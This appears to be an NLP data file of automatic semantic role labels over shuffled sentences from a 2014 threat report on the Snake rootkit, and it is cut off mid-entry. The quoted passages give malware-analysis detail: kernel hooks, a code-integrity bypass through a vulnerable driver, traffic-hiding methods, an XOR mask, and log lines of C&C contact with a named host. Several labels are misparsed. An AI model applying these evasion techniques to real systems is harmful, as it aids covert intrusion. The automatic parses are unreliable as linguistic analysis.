{"ARG0": {"text": "\u201d"}, "R-ARG0": {"text": "that"}, "V": {"text": "marks", "index": 47}, "ARG1": {"text": "whether the system was booted in WinPE mode"}}, "was": {"V": {"text": "was", "index": 51}}, "booted": {"ARG1": {"text": "the system"}, "V": {"text": "booted", "index": 52}, "ARGM-ADV": {"text": "in WinPE mode"}}}, "\n\nThe authentication is implemented by decrypting the data and making sure it starts with the markers 0xDEADBEAF and\n0xC001BA5E (which appear to derive from \u2018DEAD BEEF\u2019 and \u2018COOL BASE\u2019)": {"is": {"V": {"text": "is", "index": 2}}, "implemented": {"ARG1": {"text": "The authentication"}, "V": {"text": "implemented", "index": 3}, "ARG0": {"text": "by decrypting the data"}, "ARGM-PRD": {"text": "and making sure it starts with the markers 0xDEADBEAF and 0xC001BA5E ( which appear to derive from \u2018 DEAD BEEF \u2019 and \u2018 COOL BASE \u2019 )"}}, "decrypting": {"V": {"text": "decrypting", "index": 5}, "ARG1": {"text": "the data"}}, "making": {"ARG0": {"text": "The authentication"}, "V": {"text": "making", "index": 9}, "ARG1": {"text": "sure it starts with the markers 0xDEADBEAF and 0xC001BA5E ( which appear to derive from \u2018 DEAD BEEF \u2019 and \u2018 COOL BASE \u2019 )"}}, "starts": {"ARG1": {"text": "it"}, "V": {"text": "starts", "index": 12}, "ARG2": {"text": "with the markers 0xDEADBEAF and 0xC001BA5E ( which appear to derive from \u2018 DEAD BEEF \u2019 and \u2018 COOL BASE \u2019 )"}}, "appear": {"V": {"text": "appear", "index": 21}, "ARG1": {"text": "to derive from \u2018 DEAD BEEF \u2019 and \u2018 COOL BASE \u2019 )"}}, "derive": {"ARG1": {"text": "which"}, "V": {"text": "derive", "index": 23}, "ARG2": {"text": "from \u2018 DEAD BEEF \u2019 and \u2018 COOL BASE \u2019 )"}}}, "\n\nThe ObOpenObjectByName() hook is designed to hide the presence of its virtual partitions (described later)": {"is": {"V": {"text": "is", "index": 5}}, "designed": {"ARG1": {"text": "The ObOpenObjectByName ( ) hook"}, "V": {"text": "designed", "index": 6}, "ARG3": {"text": "to hide the presence of its virtual partitions ( described later )"}}, "hide": {"ARG0": {"text": "The ObOpenObjectByName ( ) hook"}, "V": {"text": "hide", "index": 8}, "ARG1": {"text": "the presence of its virtual partitions ( described later )"}}, "described": {"ARG1": {"text": "its virtual partitions ("}, "V": {"text": "described", "index": 16}, "ARGM-TMP": {"text": "later )"}}}, " Another reason is to overcome account restrictions imposed on a browser process in order to be able to write into files/\nregistry": {"is": {"ARG1": {"text": "Another reason"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "to overcome account restrictions imposed on a browser process in order to be able to write into files/ registry"}}, "overcome": {"V": {"text": "overcome", "index": 4}, "ARG1": {"text": "account restrictions imposed on a browser process"}, "ARGM-PRP": {"text": "in order to be able to write into files/ registry"}}, "imposed": {"ARG1": {"text": "account restrictions"}, "V": {"text": "imposed", "index": 7}, "ARG2": {"text": "on a browser process"}, "ARGM-PRP": {"text": "in order to be able to write into files/"}}, "be": {"V": {"text": "be", "index": 15}, "ARG2": {"text": "able to write into files/ registry"}}, "write": {"V": {"text": "write", "index": 18}, "ARG2": {"text": "into files/ registry"}}}, "\n\nFor example, on HTTP traffic arrival it may send traffic data into a memory pipe \\Device\\NamedPipe\\isapi_http, and then,\nsend a received peer-2-peer command message write_peer_nfo=[IP_ADDRESS:PORT]0frag_no_scrambling=Y0 into\nanother memory pipe called \\Device\\NamedPipe\\isapi_dg": {"may": {"ARGM-ADV": {"text": "on HTTP traffic arrival"}, "V": {"text": "may", "index": 8}}, "send": {"ARGM-DIS": {"text": "For example"}, "ARGM-ADV": {"text": "on HTTP traffic arrival"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "send", "index": 9}, "ARG1": {"text": "traffic data"}, "ARG2": {"text": "into a memory pipe \\Device\\NamedPipe\\isapi_http"}}, "send_2": {"ARGM-DIS": {"text": "For example"}, "ARGM-ADV": {"text": "on HTTP traffic arrival"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "may"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "send", "index": 21}, "ARG1": {"text": "a received peer-2-peer command message write_peer_nfo=[IP_ADDRESS : PORT]0frag_no_scrambling/ \\Device\\NamedPipe\\isapi_dg"}}, "PORT]0frag_no_scrambling": {"V": {"text": "PORT]0frag_no_scrambling", "index": 29}, "ARG1": {"text": "= Y0"}}, "Y0": {"V": {"text": "Y0", "index": 31}, "ARG1": {"text": "into another memory pipe called \\Device\\NamedPipe\\isapi_dg"}}, "called": {"ARG1": {"text": "another memory pipe"}, "V": {"text": "called", "index": 36}, "ARG2": {"text": "\\Device\\NamedPipe\\isapi_dg"}}}, "\n\nWith this architecture, the Snake driver is mainly used to load the DLL module into the usermode processes, and then use that\nmodule for the communications": {"is": {"V": {"text": "is", "index": 7}}, "used": {"ARGM-ADV": {"text": "With this architecture/ mainly"}, "V": {"text": "used", "index": 9}, "ARG2": {"text": "to load the DLL module into the usermode processes , and then use that module for the communications"}}, "load": {"ARG0": {"text": "the Snake driver"}, "V": {"text": "load", "index": 11}, "ARG2": {"text": "the DLL"}, "ARG1": {"text": "module into the usermode processes"}}, "use": {"ARGM-ADV": {"text": "With this architecture"}, "ARG0": {"text": "the Snake driver"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "use", "index": 22}, "ARG1": {"text": "that module"}, "ARG2": {"text": "for the communications"}}}, " The encryption algorithm is based on CAST-128, with the hard-coded key stored in the rootkit\nbody": {"is": {"V": {"text": "is", "index": 3}}, "based": {"ARG1": {"text": "The encryption algorithm"}, "V": {"text": "based", "index": 4}, "ARG2": {"text": "on CAST-128 , with the hard - coded key stored in the rootkit body"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 12}, "ARG1": {"text": "key stored"}}, "stored": {"ARG1": {"text": "the hard - coded key"}, "V": {"text": "stored", "index": 14}, "ARGM-LOC": {"text": "in the rootkit body"}}}, " It carries a list of interface identifiers associated with\nthe named pipes": {"carries": {"ARG0": {"text": "It"}, "V": {"text": "carries", "index": 1}, "ARG1": {"text": "a list of interface identifiers associated with the named pipes"}}, "associated": {"ARG1": {"text": "interface identifiers"}, "V": {"text": "associated", "index": 7}, "ARG2": {"text": "with the named pipes"}}, "named": {"V": {"text": "named", "index": 10}, "ARG2": {"text": "pipes"}}}, " If so, it considers\nit to be a system shutdown, so it unloads its usermode DLL and deactivates its own network drivers, just like it does when its\nZwShutdownSystem() hook handler gets invoked": {"considers": {"ARGM-ADV": {"text": "If so"}, "ARG0": {"text": "it"}, "V": {"text": "considers", "index": 4}, "ARG1": {"text": "it to be a system shutdown"}}, "be": {"ARG1": {"text": "it"}, "V": {"text": "be", "index": 7}, "ARG2": {"text": "a system shutdown"}}, "unloads": {"ARG0": {"text": "it"}, "V": {"text": "unloads", "index": 14}, "ARG1": {"text": "its usermode DLL"}, "ARGM-MNR": {"text": "just like it does when its ZwShutdownSystem ( ) hook handler gets invoked"}}, "deactivates": {"ARG0": {"text": "it"}, "V": {"text": "deactivates", "index": 19}, "ARG1": {"text": "its own network drivers"}, "ARGM-MNR": {"text": "just like it does when its ZwShutdownSystem ( ) hook handler gets invoked"}}, "does": {"V": {"text": "does", "index": 28}}, "invoked": {"ARG1": {"text": ") hook handler"}, "V": {"text": "invoked", "index": 37}}}, "\n\nBoth volumes appear to be set up as FAT volumes": {"appear": {"ARG1": {"text": "Both volumes"}, "V": {"text": "appear", "index": 2}, "C-ARG1": {"text": "to be set up as FAT volumes"}}, "be": {"V": {"text": "be", "index": 4}}, "set": {"ARG1": {"text": "Both volumes"}, "V": {"text": "set", "index": 5}, "ARGM-PRD": {"text": "as FAT volumes"}}}, "\n\n</section>\n\n\n <footer>                                                          BAE Systems Applied Intelligence: Snake Rootkit Report 2014             19</footer>\n\n\f\n <section>\n <heading>VIRTUAL FILE VOLUMES</heading>\nThe driver creates virtual file volumes for encrypted storage of its files and configuration data:\n<list>\n    \u2022\t \\\\.\\Hd1\n    \u2022\t \\\\.\\Hd2\n</list>\nThe volumes are mounted from the virtual file systems RawDisk1 and RawDisk2": {"are": {"ARG1": {"text": "The volumes"}, "V": {"text": "are", "index": 2}, "ARG2": {"text": "mounted from the virtual file systems RawDisk1 and RawDisk2"}}, "mounted": {"ARG1": {"text": "The volumes"}, "V": {"text": "mounted", "index": 3}, "ARGM-DIR": {"text": "from the virtual file systems RawDisk1 and RawDisk2"}}}, "\nTo send the data back, the protocol driver defines the data\nin a list of NET_BUFFER_LIST structures, and then passes\nthem to NDIS by calling NdisSendNetBufferLists()": {"send": {"V": {"text": "send", "index": 1}, "ARG1": {"text": "the data"}, "ARGM-DIR": {"text": "back"}, "ARG0": {"text": "the protocol driver"}}, "defines": {"R-ARG0": {"text": "To send the data back"}, "ARG0": {"text": "the protocol driver"}, "V": {"text": "defines", "index": 9}, "ARG1": {"text": "the data"}, "ARG2": {"text": "in a list of NET_BUFFER_LIST"}}, "passes": {"R-ARG0": {"text": "To send the data back"}, "ARG0": {"text": "the protocol driver"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "passes", "index": 21}, "ARG1": {"text": "them"}, "ARG2": {"text": "to NDIS"}, "ARGM-MNR": {"text": "by calling NdisSendNetBufferLists ( )"}}, "calling": {"V": {"text": "calling", "index": 26}, "ARG1": {"text": "NdisSendNetBufferLists"}}}, "\n\n For example, it stores its message queue in a file called:\n<list>\n \\.\\\\Hd1\\queue\n</list>\n The message queue indicates an asynchronous communication model between kernel mode driver and a usermode DLL,\n e.g": {"stores": {"ARGM-DIS": {"text": "For example"}, "ARG0": {"text": "it"}, "V": {"text": "stores", "index": 4}, "ARG1": {"text": "its message queue"}, "ARG2": {"text": "in a file called"}}, "called": {"ARG1": {"text": "a file"}, "V": {"text": "called", "index": 11}}, "indicates": {"ARG0": {"text": "The message queue"}, "V": {"text": "indicates", "index": 16}, "ARG1": {"text": "an asynchronous communication model between kernel mode driver and a usermode DLL , e.g"}}}, "\n\nDepending on the variant, the DLL is dropped either under a random name or a hard-coded name, such as mscpx32n.dll": {"Depending": {"V": {"text": "Depending", "index": 0}, "ARG1": {"text": "on the variant"}}, "is": {"V": {"text": "is", "index": 7}}, "dropped": {"ARGM-ADV": {"text": "Depending on the variant/ either"}, "ARG1": {"text": "the DLL"}, "V": {"text": "dropped", "index": 8}, "ARGM-MNR": {"text": "under a random name or a hard - coded name , such as mscpx32n.dll"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 18}, "ARG1": {"text": "name"}}}, "\n\nBeing able to fully manipulate traffic at 3 different levels (NDIS protocol driver, TDI Driver, and WPF callout driver), Snake is able to\n\u2018inject\u2019 the traffic into existing communications to reach out to external components, and at the same time parse all incoming traffic\nto detect traffic addressed to itself:\n<figure>\n                                                                                       Infected User        Injected\n                                    Traffic Interception                                 Application        Module\n                                0xDEADBEAF/0xC001BA5E\n                                           Checks\n                                                    WFP           TDI          NDIS\n                  Internet                                                                                        Memory\n                                                                                                                   pipes\n                                      Traffic\n                                    Injection\n\n\n                                                                        Snake\u2019s Kernel Mode Driver\n</figure>\n\n</section>\n<footer>                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014           17</footer>\n\n\f\n<section>\n<heading>DEAD BEEF ON A COOL BASE</heading>\nAs the driver intercepts all connections (e.g": {"Being": {"V": {"text": "Being", "index": 0}, "ARG2": {"text": "able to fully manipulate traffic at 3 different levels ( NDIS protocol driver , TDI Driver , and WPF callout driver )"}, "ARG1": {"text": "Snake"}}, "manipulate": {"ARGM-EXT": {"text": "fully"}, "V": {"text": "manipulate", "index": 4}, "ARG1": {"text": "traffic"}, "ARGM-LOC": {"text": "at 3 different levels ( NDIS protocol driver , TDI Driver"}}, "is": {"ARGM-PRD": {"text": "Being able to fully manipulate traffic at 3 different levels ( NDIS protocol driver , TDI Driver , and WPF callout driver )"}, "ARG1": {"text": "Snake"}, "V": {"text": "is", "index": 25}, "ARG2": {"text": "able to \u2018 inject \u2019 the traffic into existing communications to reach out to external components"}}, "inject": {"V": {"text": "inject", "index": 29}, "ARG1": {"text": "\u2019 the traffic"}}, "existing": {"V": {"text": "existing", "index": 34}, "ARG1": {"text": "communications"}}, "reach": {"V": {"text": "reach", "index": 37}, "ARG1": {"text": "to external components"}}, "detect": {"ARG0": {"text": "parse"}, "V": {"text": "detect", "index": 53}, "ARG1": {"text": "traffic addressed to itself"}}, "addressed": {"ARG0": {"text": "traffic"}, "V": {"text": "addressed", "index": 55}, "ARG2": {"text": "to itself"}}, "intercepts": {"ARG0": {"text": "the driver"}, "V": {"text": "intercepts", "index": 62}, "ARG1": {"text": "all connections ( e.g"}}}, "\nThis explains why Snake dropper registers itself as a service to start each time Windows starts: in order to install the vulnerable\nVBox driver first, then pass it a malformed structure to disable Code Integrity control with a DeviceIoControl() API call, and\nfinally, load the driver": {"explains": {"ARG0": {"text": "This"}, "V": {"text": "explains", "index": 1}, "ARG1": {"text": "why Snake dropper registers itself as a service to start each time Windows starts : in order to install"}}, "registers": {"ARGM-CAU": {"text": "why"}, "ARG0": {"text": "Snake dropper"}, "V": {"text": "registers", "index": 5}, "ARG1": {"text": "itself"}, "ARG2": {"text": "as a service to start each time Windows starts"}}, "start": {"V": {"text": "start", "index": 11}, "ARGM-TMP": {"text": "each time Windows starts"}}, "starts": {"ARGM-TMP": {"text": "each"}, "ARG1": {"text": "Windows"}, "V": {"text": "starts", "index": 15}}, "install": {"V": {"text": "install", "index": 20}, "ARG1": {"text": "the vulnerable VBox driver"}, "ARGM-TMP": {"text": "first"}}, "pass": {"ARGM-PRP": {"text": "in order to install the vulnerable VBox driver first"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "pass", "index": 28}, "ARG1": {"text": "it"}, "ARG2": {"text": "a malformed structure to disable Code Integrity control with a DeviceIoControl ( ) API call"}}, "malformed": {"V": {"text": "malformed", "index": 31}, "ARG1": {"text": "structure"}}, "load": {"ARGM-PRP": {"text": "in order to install the vulnerable VBox driver first"}, "ARGM-TMP": {"text": "then/ finally"}, "V": {"text": "load", "index": 49}, "ARG2": {"text": "the driver"}}}, " It attempts to do this by\nrunning MS09-025 and MS10-015 exploits on the target system": {"attempts": {"ARG0": {"text": "It"}, "V": {"text": "attempts", "index": 1}, "ARG1": {"text": "to do this by running MS09 - 025 and MS10 - 015 exploits on the target system"}}, "do": {"ARG0": {"text": "It"}, "V": {"text": "do", "index": 3}, "ARG1": {"text": "this"}, "ARGM-MNR": {"text": "by running MS09 - 025 and/ on the target system"}}, "running": {"ARG0": {"text": "It"}, "V": {"text": "running", "index": 6}, "ARG1": {"text": "MS09 - 025"}}}, "\n\nThe presence of the reconnaissance tool in the Snake operators\u2019 framework suggests the existence of an arsenal of infiltration\ntools, designed to compromise a system, then find a way to replicate into other hosts, infect them, and spread the infection\neven further": {"suggests": {"ARG0": {"text": "The presence of the reconnaissance tool in the Snake operators \u2019 framework"}, "V": {"text": "suggests", "index": 12}, "ARG1": {"text": "the existence of an arsenal of infiltration tools , designed to compromise a system , then find a way to replicate into other hosts , infect them , and spread the infection even further"}}, "designed": {"ARG1": {"text": "an arsenal of infiltration tools"}, "V": {"text": "designed", "index": 22}, "ARG3": {"text": "to compromise a system"}}, "compromise": {"ARG0": {"text": "an arsenal of infiltration tools"}, "V": {"text": "compromise", "index": 24}, "ARG1": {"text": "a system"}}, "find": {"ARG0": {"text": "an arsenal of infiltration tools"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "find", "index": 29}, "ARG1": {"text": "a way to replicate into other hosts , infect them"}}, "replicate": {"ARGM-MNR": {"text": "a way"}, "V": {"text": "replicate", "index": 33}, "ARG1": {"text": "into other hosts"}}, "infect": {"ARG0": {"text": "an arsenal of infiltration tools"}, "ARGM-MNR": {"text": "a way"}, "V": {"text": "infect", "index": 38}, "ARG1": {"text": "them"}}, "spread": {"V": {"text": "spread", "index": 42}, "ARG1": {"text": "the infection"}, "ARGM-ADV": {"text": "even further"}}}, " A great deal of attention has also\nbeen given to keep its network communications as quiet as possible": {"has": {"V": {"text": "has", "index": 5}}, "been": {"V": {"text": "been", "index": 7}}, "given": {"ARG1": {"text": "A great deal of attention"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "given", "index": 8}, "ARGM-PRP": {"text": "to keep its network communications as quiet as possible"}}, "keep": {"V": {"text": "keep", "index": 10}, "ARG1": {"text": "its network communications"}, "ARG2": {"text": "as quiet as possible"}}}, " When the data arrives, it is intercepted with the\nFwpsCopyStreamDataToBuffer0() API, and then scanned for the presence of the hidden commands from C&C": {"arrives": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "the data"}, "V": {"text": "arrives", "index": 3}}, "is": {"ARGM-TMP": {"text": "When the data arrives"}, "ARG1": {"text": "it"}, "V": {"text": "is", "index": 6}, "ARGM-ADV": {"text": "intercepted"}, "ARG2": {"text": "with the FwpsCopyStreamDataToBuffer0 ( ) API , and then scanned for the presence of the hidden commands from C&C"}}, "intercepted": {"ARGM-TMP": {"text": "When the data arrives"}, "ARG1": {"text": "it"}, "V": {"text": "intercepted", "index": 7}, "ARGM-MNR": {"text": "with the FwpsCopyStreamDataToBuffer0 ( ) API"}}, "scanned": {"ARGM-TMP": {"text": "When the data arrives/ then"}, "ARG0": {"text": "it"}, "V": {"text": "scanned", "index": 17}, "ARG1": {"text": "for the presence of the hidden commands from C&C"}}, "hidden": {"V": {"text": "hidden", "index": 23}, "ARG1": {"text": "commands"}}}, "\n\n\nBy \u2018sniffing\u2019 all the requests, it can now inspect the traffic, looking for and then parsing GET/POST HTTP requests and also SMTP\ncommunications, in order to distinguish commands addressed to itself": {"can": {"V": {"text": "can", "index": 9}}, "inspect": {"ARGM-MNR": {"text": "By \u2018 sniffing \u2019 all the requests"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "can"}, "ARGM-TMP": {"text": "now"}, "V": {"text": "inspect", "index": 11}, "ARG1": {"text": "the traffic"}, "ARGM-ADV": {"text": "looking for and then parsing GET / POST HTTP requests and also SMTP communications"}, "ARG2": {"text": "in order to distinguish commands addressed to itself"}}, "looking": {"ARG0": {"text": "it"}, "V": {"text": "looking", "index": 15}, "ARG1": {"text": "for"}, "ARGM-PRP": {"text": "in order to distinguish commands addressed to itself"}}, "parsing": {"ARG0": {"text": "it"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "parsing", "index": 19}, "ARG1": {"text": "GET / POST HTTP requests"}, "ARGM-PRP": {"text": "in order to distinguish commands addressed to itself"}}, "distinguish": {"V": {"text": "distinguish", "index": 33}, "ARG1": {"text": "commands"}}, "addressed": {"ARG1": {"text": "commands"}, "V": {"text": "addressed", "index": 35}, "ARG2": {"text": "to itself"}}}, "\nNDIS, in turn, calls the miniport driver\u2019s\nMiniportSendNetBufferLists() function to forward\nthe data to an underlying miniport driver": {"calls": {"ARG0": {"text": "NDIS"}, "ARGM-ADV": {"text": "in turn"}, "V": {"text": "calls", "index": 5}, "ARG1": {"text": "the miniport driver \u2019s MiniportSendNetBufferLists"}, "ARG2": {"text": "to forward the data to an underlying miniport driver"}}, "function": {"ARG0": {"text": "NDIS/ calls the miniport driver \u2019s MiniportSendNetBufferLists ( )"}, "ARGM-ADV": {"text": "in turn"}, "V": {"text": "function", "index": 13}, "ARGM-DIR": {"text": "to forward the data"}, "ARG2": {"text": "to an underlying miniport driver"}}}, " Its ability to hibernate, staying fully inactive for a number of days, makes its detection during that time very\ndifficult": {"hibernate": {"V": {"text": "hibernate", "index": 3}}, "staying": {"V": {"text": "staying", "index": 5}, "ARG3": {"text": "fully inactive"}, "ARGM-TMP": {"text": "for a number of days"}}, "makes": {"ARG0": {"text": "Its ability to hibernate , staying fully inactive for a number of days ,"}, "V": {"text": "makes", "index": 14}, "ARG1": {"text": "its detection"}, "ARGM-TMP": {"text": "during that time very difficult"}}}, "\n\nAs long as the user is not using the Internet, Snake stays dormant too, as there is no process that communicates with the web\nservers": {"is": {"V": {"text": "is", "index": 5}}, "using": {"ARG0": {"text": "the user"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "using", "index": 7}, "ARG1": {"text": "the Internet"}}, "stays": {"ARGM-ADV": {"text": "As long as the user is not using the Internet/ too/ as there is no process that communicates with the web servers"}, "ARG0": {"text": "Snake"}, "V": {"text": "stays", "index": 12}, "ARG3": {"text": "dormant"}}, "is_2": {"V": {"text": "is", "index": 18}, "ARG1": {"text": "no process that communicates with the web servers"}}, "communicates": {"ARG0": {"text": "no process"}, "R-ARG0": {"text": "that"}, "V": {"text": "communicates", "index": 22}, "ARG2": {"text": "with the web servers"}}}, " The message queue file\ncontains configuration data and the libraries that will be injected into usermode processes": {"contains": {"ARG0": {"text": "The message queue file"}, "V": {"text": "contains", "index": 4}, "ARG1": {"text": "configuration data and the libraries that will be injected into usermode processes"}}, "will": {"V": {"text": "will", "index": 11}}, "be": {"V": {"text": "be", "index": 12}}, "injected": {"ARG1": {"text": "configuration data and the libraries"}, "R-ARG1": {"text": "that"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "injected", "index": 13}, "ARG2": {"text": "into usermode processes"}}}, " on TDI_RECEIVE TDI event or ClientEventReceive() event notification triggered\nthrough its TDI Filter Driver), it parses all incoming HTTP and SMTP traffic to see if it can be authenticated as Snake traffic": {"triggered": {"ARGM-ADV": {"text": "on TDI_RECEIVE TDI"}, "ARG1": {"text": ") event notification"}, "V": {"text": "triggered", "index": 10}, "ARGM-DIR": {"text": "through its TDI Filter Driver )"}}, "parses": {"ARGM-ADV": {"text": "on TDI_RECEIVE TDI event or ClientEventReceive ( ) event notification triggered through its TDI Filter Driver )"}, "V": {"text": "parses", "index": 19}, "ARG1": {"text": "all incoming HTTP and SMTP traffic"}, "ARGM-PRP": {"text": "to see if it can be authenticated as Snake traffic"}}, "see": {"V": {"text": "see", "index": 27}, "ARG1": {"text": "if it can be authenticated as Snake traffic"}}, "can": {"V": {"text": "can", "index": 30}}, "be": {"V": {"text": "be", "index": 31}}, "authenticated": {"ARG1": {"text": "it"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "authenticated", "index": 32}, "ARG2": {"text": "as Snake traffic"}}}, " Unlike traditional worm\ntechniques, this process is rather manual, but its danger is in the fact that the attacker can flexibly craft new attack methods,\nadjusting them to the hosts present within the network, thus preying on the weakest (least updated, most vulnerable) victims along\nits path": {"is": {"ARGM-MNR": {"text": "Unlike traditional worm techniques"}, "ARG1": {"text": "this process"}, "V": {"text": "is", "index": 7}, "ARG2": {"text": "rather manual"}}, "is_2": {"ARG1": {"text": "its danger"}, "V": {"text": "is", "index": 14}, "ARG2": {"text": "in the fact that the attacker can flexibly craft new attack methods , adjusting them to the hosts present within the network , thus preying on the weakest ( least updated , most vulnerable ) victims along its path"}}, "can": {"V": {"text": "can", "index": 21}}, "craft": {"ARG0": {"text": "the attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "craft", "index": 23}, "ARG1": {"text": "new attack methods"}}, "adjusting": {"ARG0": {"text": "the attacker"}, "V": {"text": "adjusting", "index": 28}, "ARG1": {"text": "them"}, "ARG4": {"text": "to the hosts present within the network"}}, "preying": {"ARG0": {"text": "the attacker"}, "ARGM-DIS": {"text": "thus"}, "V": {"text": "preying", "index": 39}, "ARG1": {"text": "on the weakest ( least updated"}}, "updated": {"ARG1": {"text": "weakest ( least"}, "V": {"text": "updated", "index": 45}}}, "\n\nAs a result, whenever the data is saved into the volume Hd1, it will be scrambled on-the-fly, and reflected in the persistent storage\nfile hotfix.dat, which is physically located within the rootkit\u2019s \u2018home\u2019 directory:\n<figure>\n   Z:\\WINDOWS\\$NtuninstallQ817473$>dir\n     Volume in drive Z has no label": {"is": {"V": {"text": "is", "index": 7}}, "saved": {"ARGM-TMP": {"text": "whenever"}, "ARG1": {"text": "the data"}, "V": {"text": "saved", "index": 8}, "ARG3": {"text": "into the volume Hd1"}}, "will": {"V": {"text": "will", "index": 15}}, "be": {"ARGM-TMP": {"text": "whenever"}, "ARG1": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "be", "index": 16}, "ARG2": {"text": "scrambled"}}, "scrambled": {"ARGM-DIS": {"text": "As a result"}, "ARGM-TMP": {"text": "whenever the data is saved into the volume Hd1"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "scrambled", "index": 17}, "ARG1": {"text": "on - the - fly"}}, "reflected": {"ARGM-DIS": {"text": "As a result"}, "ARGM-TMP": {"text": "whenever the data is saved into the volume Hd1"}, "ARG1": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "reflected", "index": 25}, "ARG2": {"text": "in the persistent storage file hotfix.dat , which is physically located within the rootkit \u2019s \u2018 home \u2019 directory"}}, "is_2": {"V": {"text": "is", "index": 34}}, "located": {"ARG1": {"text": "the persistent storage file hotfix.dat"}, "R-ARG1": {"text": "which"}, "ARGM-MNR": {"text": "physically"}, "V": {"text": "located", "index": 36}, "ARGM-LOC": {"text": "within the rootkit \u2019s \u2018 home \u2019 directory"}}, "has": {"ARG0": {"text": "dir Volume in drive Z"}, "V": {"text": "has", "index": 51}, "ARG1": {"text": "no label"}}}, "\n\nHiding a few DNS/HTTP requests among busy network traffic allows Snake rootkit to stay unnoticed": {"Hiding": {"V": {"text": "Hiding", "index": 0}, "ARG1": {"text": "a few DNS / HTTP requests"}, "ARGM-LOC": {"text": "among busy network traffic allows Snake rootkit to stay unnoticed"}}, "allows": {"ARG0": {"text": "Hiding a few DNS / HTTP requests among busy network traffic"}, "V": {"text": "allows", "index": 11}, "ARG1": {"text": "Snake rootkit to stay unnoticed"}}, "stay": {"ARG1": {"text": "Snake rootkit"}, "V": {"text": "stay", "index": 15}, "ARG3": {"text": "unnoticed"}}}, "\n\nThe purpose of this DLL is to be injected into the user-mode processes": {"is": {"ARG1": {"text": "The purpose of this DLL"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "to be injected into the user - mode processes"}}, "be": {"V": {"text": "be", "index": 7}}, "injected": {"V": {"text": "injected", "index": 8}, "ARG2": {"text": "into the user - mode processes"}}}, " OK\n      03:52:06 1336: GET /D/pub.txt\n      03:52:07 1336: Http status: 200\n      03:52:07 1336: recv 1/1\n      03:52:07 DownLoad 1 command(s)\n</list>\nOnce acknowledged, it asks the server for a command, and the server returns a new command to execute:\n<list>\n      03:52:11 1404: Connect swim.onlinewebshop.net                    type(0)..": {"GET": {"V": {"text": "GET", "index": 4}}, "Connect": {"V": {"text": "Connect", "index": 28}, "ARG1": {"text": "swim.onlinewebshop.net type(0"}}}, " In order to decrypt it, the malware first\napplies the XOR mask to the bytes that start from offset 0x40:\n<list>\n    1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6g\n    s923HL34x2f5cvd0fk6c1a0s\n</list>\nAn identical XOR mask was also used by Agent.BTZ": {"decrypt": {"V": {"text": "decrypt", "index": 3}, "ARG1": {"text": "it"}}, "applies": {"ARGM-PRP": {"text": "In order to decrypt it"}, "ARG0": {"text": "the malware"}, "ARGM-TMP": {"text": "first"}, "V": {"text": "applies", "index": 9}, "ARG1": {"text": "the XOR mask"}, "ARG2": {"text": "to the bytes that start from offset 0x40"}}, "start": {"ARG1": {"text": "the bytes"}, "R-ARG1": {"text": "that"}, "V": {"text": "start", "index": 17}, "ARG2": {"text": "from offset 0x40"}}, "was": {"V": {"text": "was", "index": 26}}, "used": {"ARG1": {"text": "An identical XOR mask"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "used", "index": 28}, "ARG0": {"text": "by Agent . BTZ"}}}, "\n\nTo encrypt data stored on its virtual partitions, the driver sets a hook for another API:\n<list>\n         IofCallDriver()\n</list>\nTo re-infect the usermode process svchost.exe and to re-enable its network drivers, the rootkit hooks these APIs:\n<list>\n    \u2022\t ZwCreateThread\n    \u2022\t ZwCreateUserProcess\n</list>\n\n</section>\n<section>\n<heading>\nWFP CALLOUT DRIVER</heading>\nSnake then proceeds to the task of deep packet inspection and modification": {"encrypt": {"V": {"text": "encrypt", "index": 1}, "ARG1": {"text": "data stored on its virtual partitions"}, "ARG0": {"text": "the driver"}}, "stored": {"V": {"text": "stored", "index": 3}, "ARGM-LOC": {"text": "on its virtual partitions"}}, "sets": {"R-ARG0": {"text": "To encrypt data stored on its virtual partitions"}, "ARG0": {"text": "the driver"}, "V": {"text": "sets", "index": 11}, "ARG1": {"text": "a hook for another API"}}, "proceeds": {"ARG1": {"text": "Snake"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "proceeds", "index": 20}, "ARGM-ADV": {"text": "to the task of"}, "ARGM-EXT": {"text": "deep packet inspection and modification"}}}, "\n\n   \u2022\t   In the first mode, it relies on Windows Internet (WinINet) APIs, such as HttpOpenRequest(), HttpSendRequest(),\n        InternetReadFile(), etc": {"relies": {"ARGM-LOC": {"text": "\u2022 In the first mode"}, "ARG0": {"text": "it"}, "V": {"text": "relies", "index": 7}, "ARG1": {"text": "on Windows Internet ( WinINet ) APIs , such as HttpOpenRequest ( ) , HttpSendRequest ( ) , InternetReadFile ( ) , etc"}}}, " In order to find the variable in kernel memory, the Snake\ndropper loads a copy of the NT core image (ntoskrnl.exe), locates the import of CI.dll\u2019s function CiInitialize(), and then\nSepInitializeCodeIntegrity() within it": {"find": {"V": {"text": "find", "index": 3}, "ARG1": {"text": "the variable in kernel memory"}}, "loads": {"ARGM-PRP": {"text": "In order to find the variable in kernel memory"}, "ARG0": {"text": "the Snake dropper"}, "V": {"text": "loads", "index": 13}, "ARG2": {"text": "a copy of the NT core image ( ntoskrnl.exe"}}, "locates": {"ARGM-PRP": {"text": "In order to find the variable in kernel 